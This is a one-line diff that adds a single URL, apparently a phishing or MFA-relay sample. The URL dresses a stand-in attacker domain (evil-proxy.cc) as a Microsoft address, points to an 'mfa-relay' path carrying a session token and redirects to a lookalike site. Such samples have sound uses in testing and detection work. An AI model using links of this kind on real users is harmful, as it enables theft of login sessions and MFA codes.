@@ -1,0 +1,1 @@
+https://microsoft.com.evil-proxy.cc/mfa-relay?session_token=fake&redirect=https://real-microsoft.com
